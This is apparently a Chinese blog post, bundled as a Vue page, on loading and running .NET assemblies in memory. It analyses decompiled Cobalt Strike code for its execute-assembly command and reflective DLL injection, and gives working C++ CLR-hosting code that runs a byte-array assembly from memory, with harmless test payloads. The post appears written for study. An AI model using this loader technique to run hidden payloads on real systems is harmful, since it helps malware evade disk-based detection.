Strike的代码中找到BeaconConsole.java文件，定位到“execute-assembly”命令处。通过简单分析这段代码可以知道，当解析到用户执行“execute-assembly”命令后，会先验证”pZ“和”F“关键字来判断要执行的.net程序集是否带有参数（具体如何判断请查看CommandParser类）。判断完成使用CommandParser类的popstring方法将execute-assembly的参数赋值给变量，然后调用ExecuteAssembly方法执行程序集。</p>',4),h={href:"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220114182430780-16443915545351.png",target:"_blank",rel:"noopener noreferrer"},C=n("img",{src:c,alt:"image-20220114182430780",tabindex:"0",loading:"lazy"},null,-1),f=n("figcaption",null,"image-20220114182430780",-1),E=n("p",null,"我们继续跟进ExecuteAssembly方法，ExecuteAssembly方法有两个参数，第一个参数为待执行的.net程序集路径，第二个参数为.net程序集执行需要的参数。执行这个方法时先将要执行的.net程序集从硬盘读取并加载到PE解析器（PEParser）中，随后判断加载的PE文件是否为.net程序集，如果是.net程序集则创建ExecuteAssemblyJob实例并调用spawn方法。",-1),y={href:"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220114182256752.png",target:"_blank",rel:"noopener noreferrer"},I=n("img",{src:o,alt:"image-20220114182256752",tabindex:"0",loading:"lazy"},null,-1),B=n("figcaption",null,"image-20220114182256752",-1),R=e(`<p>接下来进入spawn方法，可以看到是<strong>通过反射DLL的方法，将invokeassembly.dll注入到进程当中</strong>（这块也不知道咋实现的），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDLLContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">int</span> var3 <span class="token operator">=</span> <span class="token class-name">ReflectiveDLL</span><span class="token punctuation">.</span><span class="token function">findReflectiveLoader</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>tasker<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;Could not find reflective loader in &quot;</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDLLName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ReflectiveDLL</span><span class="token punctuation">.</span><span class="token function">is64</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ignoreToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
               <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ignoreToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token number">87</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fix</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tasker<span class="token punctuation">.</span><span class="token function">obfuscatePostEx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_obfuscate</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>

         var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setupSmartInject</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCallbackType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getWaitTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addLengthAndString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getShortDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>tasker<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getTactic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),L={href:"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220209135538841.png",target:"_blank",rel:"noopener noreferrer"},D=n("img",{src:u,alt:"image-20220209135538841",tabindex:"0",loading:"lazy"},null,-1),_=n("figcaption",null,"image-20220209135538841",-1),S={href:"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220117192352767.png",target:"_blank",rel:"noopener noreferrer"},w=n("img",{src:r,alt:"image-20220117192352767",tabindex:"0",loading:"lazy"},null,-1),x=n("figcaption",null,"image-20220117192352767",-1),N=e(`<p>总结一下，Cobalt Strike内存加载执行.net程序集大概的过程就是，首先spawn一个进程并传输invokeassembly.dll注入到该进程，invokeassembly.dll实现了在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。</p><p><strong>那么invokeassembly.dll内部是如何操作的呢？</strong></p><h3 id="_2-3-硬盘加载执行-net程序集" tabindex="-1"><a class="header-anchor" href="#_2-3-硬盘加载执行-net程序集" aria-hidden="true">#</a> 2.3. 硬盘加载执行.NET程序集</h3><ol><li>初始化ICLRMetaHost接口。</li><li>通过ICLRMetaHost获取ICLRRuntimeInfo接口。</li><li>通过ICLRRuntimeInfo将 CLR 加载到当前进程并返回运行时接口ICLRRuntimeHost指针。</li><li>通过ICLRRuntimeHost.Start()初始化CLR。</li><li>通过ICLRRuntimeHost.EecuteInDefaultAppDomain执行指定程序集(硬盘上)。</li></ol><h4 id="示例代码" tabindex="-1"><a class="header-anchor" href="#示例代码" aria-hidden="true">#</a> 示例代码</h4><p><strong>unmanaged.cpp</strong></p><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>#include &lt;metahost.h&gt;
#pragma comment(lib, &quot;mscoree.lib&quot;)

int main()
{
    ICLRMetaHost* iMetaHost = NULL;
    ICLRRuntimeInfo* iRuntimeInfo = NULL;
    ICLRRuntimeHost* iRuntimeHost = NULL;

    //初始化环境
    CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&amp;iMetaHost);
    iMetaHost-&gt;GetRuntime(L&quot;v4.0.30319&quot;, IID_ICLRRuntimeInfo, (LPVOID*)&amp;iRuntimeInfo);
    iRuntimeInfo-&gt;GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&amp;iRuntimeHost);
    iRuntimeHost-&gt;Start();

    //执行
    iRuntimeHost-&gt;ExecuteInDefaultAppDomain(L&quot;C:\\\\TEST.exe&quot;, L&quot;TEST.Program&quot;, L&quot;print&quot;, L&quot;test&quot;, NULL);

    //释放
    iRuntimeInfo-&gt;Release();
    iMetaHost-&gt;Release();
    iRuntimeHost-&gt;Release();

    return 0;
};
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行的C#源码</p><div class="language-Csharp line-numbers-mode" data-ext="Csharp"><pre class="language-Csharp"><code>using System;

namespace TEST
{
    class Program
    {
        static int Main(String[] args)
        {

            return 1;
        }
        static int print(String strings)
        {
            Console.WriteLine(strings);
            return 1;
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-4-内存加载执行-net程序集" tabindex="-1"><a class="header-anchor" href="#_2-4-内存加载执行-net程序集" aria-hidden="true">#</a> 2.4. 内存加载执行.NET程序集</h3><p>1.初始化CLR环境(同上)</p><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>	CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&amp;iMetaHost);
	iMetaHost-&gt;GetRuntime(L&quot;v4.0.30319&quot;, IID_ICLRRuntimeInfo, (VOID**)&amp;iRuntimeInfo);
	iRuntimeInfo-&gt;GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&amp;iRuntimeHost);
	iRuntimeHost-&gt;Start();
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2.通过ICLRRuntimeHost获取AppDomain接口指针，然后通过AppDomain接口的QueryInterface方法来查询默认应用程序域的实例指针。</p><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>	iRuntimeHost-&gt;GetDefaultDomain(&amp;pAppDomain);
	pAppDomain-&gt;QueryInterface(__uuidof(_AppDomain), (VOID**)&amp;pDefaultAppDomain);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>3.通过默认应用程序域实例的Load_3方法加载安全.net程序集数组，并返回Assembly的实例对象指针，通过Assembly实例对象的get_EntryPoint方法获取描述入口点的MethodInfo实例对象。</p><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>	saBound[0].cElements = ASSEMBLY_LENGTH;
	saBound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, saBound);

	SafeArrayAccessData(pSafeArray, &amp;pData);
	memcpy(pData, dotnetRaw, ASSEMBLY_LENGTH);
	SafeArrayUnaccessData(pSafeArray);

	pDefaultAppDomain-&gt;Load_3(pSafeArray, &amp;pAssembly);
	pAssembly-&gt;get_EntryPoint(&amp;pMethodInfo);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>4.创建参数安全数组</p><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>ZeroMemory(&amp;vRet, sizeof(VARIANT));
	ZeroMemory(&amp;vObj, sizeof(VARIANT));
	vObj.vt = VT_NULL;

	vPsa.vt = (VT_ARRAY | VT_BSTR);
	args = SafeArrayCreateVector(VT_VARIANT, 0, 1);

	if (argc &gt; 1)
	{
		vPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);
		for (long i = 0; i &lt; argc; i++)
		{
			SafeArrayPutElement(vPsa.parray, &amp;i, SysAllocString(argv[i]));
		}

		long idx[1] = { 0 };
		SafeArrayPutElement(args, idx, &amp;vPsa);
	}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>5.通过描述入口点的MethodInfo实例对象的Invoke方法执行入口点。</p><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>HRESULT hr = pMethodInfo-&gt;Invoke_3(vObj, args, &amp;vRet);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="示例代码-1" tabindex="-1"><a class="header-anchor" href="#示例代码-1" aria-hidden="true">#</a> 示例代码</h4><div class="language-Cpp line-numbers-mode" data-ext="Cpp"><pre class="language-Cpp"><code>#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;
#include &lt;metahost.h&gt;
#pragma comment(lib, &quot;mscoree.lib&quot;)

#import &lt;mscorlib.tlb&gt; raw_interfaces_only			\\
    	high_property_prefixes(&quot;_get&quot;,&quot;_put&quot;,&quot;_putref&quot;)		\\
    	rename(&quot;ReportEvent&quot;, &quot;InteropServices_ReportEvent&quot;)	\\
	rename(&quot;or&quot;, &quot;InteropServices_or&quot;)

using namespace mscorlib;
#define ASSEMBLY_LENGTH  8192


unsigned char dotnetRaw[8192] =
&quot;\\x4d\\x5a\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00...&quot;;//.net程序集字节数组



int _tmain(int argc, _TCHAR* argv[])
{

	ICLRMetaHost* iMetaHost = NULL;
	ICLRRuntimeInfo* iRuntimeInfo = NULL;
	ICorRuntimeHost* iRuntimeHost = NULL;
	IUnknownPtr pAppDomain = NULL;
	_AppDomainPtr pDefaultAppDomain = NULL;
	_AssemblyPtr pAssembly = NULL;
	_MethodInfoPtr pMethodInfo = NULL;
	SAFEARRAYBOUND saBound[1];
	void* pData = NULL;
	VARIANT vRet;
	VARIANT vObj;
	VARIANT vPsa;
	SAFEARRAY* args = NULL;

	CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&amp;iMetaHost);
	iMetaHost-&gt;GetRuntime(L&quot;v4.0.30319&quot;, IID_ICLRRuntimeInfo, (VOID**)&amp;iRuntimeInfo);
	iRuntimeInfo-&gt;GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&amp;iRuntimeHost);
	iRuntimeHost-&gt;Start();


	iRuntimeHost-&gt;GetDefaultDomain(&amp;pAppDomain);
	pAppDomain-&gt;QueryInterface(__uuidof(_AppDomain), (VOID**)&amp;pDefaultAppDomain);

	saBound[0].cElements = ASSEMBLY_LENGTH;
	saBound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, saBound);

	SafeArrayAccessData(pSafeArray, &amp;pData);
	memcpy(pData, dotnetRaw, ASSEMBLY_LENGTH);
	SafeArrayUnaccessData(pSafeArray);

	pDefaultAppDomain-&gt;Load_3(pSafeArray, &amp;pAssembly);
	pAssembly-&gt;get_EntryPoint(&amp;pMethodInfo);

	ZeroMemory(&amp;vRet, sizeof(VARIANT));
	ZeroMemory(&amp;vObj, sizeof(VARIANT));
	vObj.vt = VT_NULL;



	vPsa.vt = (VT_ARRAY | VT_BSTR);
	args = SafeArrayCreateVector(VT_VARIANT, 0, 1);

	if (argc &gt; 1)
	{
		vPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);
		for (long i = 0; i &lt; argc; i++)
		{
			SafeArrayPutElement(vPsa.parray, &amp;i, SysAllocString(argv[i]));
		}

		long idx[1] = { 0 };
		SafeArrayPutElement(args, idx, &amp;vPsa);
	}

	HRESULT hr = pMethodInfo-&gt;Invoke_3(vObj, args, &amp;vRet);
	pMethodInfo-&gt;Release();
	pAssembly-&gt;Release();
	pDefaultAppDomain-&gt;Release();
	iRuntimeInfo-&gt;Release();
	iMetaHost-&gt;Release();
	CoUninitialize();

	return 0;
};

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行的C#源码</p><div class="language-Csharp line-numbers-mode" data-ext="Csharp"><pre class="language-Csharp"><code>using System;

namespace TEST
{
    class Program
    {
        static int Main(String[] args)
        {
            Console.WriteLine(&quot;hello world!&quot;);
            foreach (var s in args)
            {
                Console.WriteLine(s);
            }
            return 1;
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_3-managed代码内存加载执行pe文件" tabindex="-1"><a class="header-anchor" href="#_3-managed代码内存加载执行pe文件" aria-hidden="true">#</a> 3. managed代码内存加载执行PE文件</h2><p>需要自己实现PE加载器</p><h2 id="_4-unmanaged代码内存加载执行pe文件" tabindex="-1"><a class="header-anchor" href="#_4-unmanaged代码内存加载执行pe文件" aria-hidden="true">#</a> 4. unmanaged代码内存加载执行PE文件</h2><p>需要自己实现PE加载器</p><p>TODO:反射dll注入</p>`,29);function M(T,G){const A=t("ExternalLinkIcon");return l(),d("div",null,[v,n("p",null,[n("a",m,[a("Assembly.Load Method (System.Reflection) | Microsoft Learn"),s(A)])]),b,n("p",null,[n("a",g,[a("ICLRRuntimeHost Interface - .NET Framework | Microsoft Learn"),s(A)])]),k,n("figure",null,[n("a",h,[C,s(A)]),f]),E,n("figure",null,[n("a",y,[I,s(A)]),B]),R,n("figure",null,[n("a",L,[D,s(A)]),_]),n("figure",null,[n("a",S,[w,s(A)]),x]),N])}const q=i(p,[["render",M],["__file","PELoader.html.vue"]]);export{q as default};
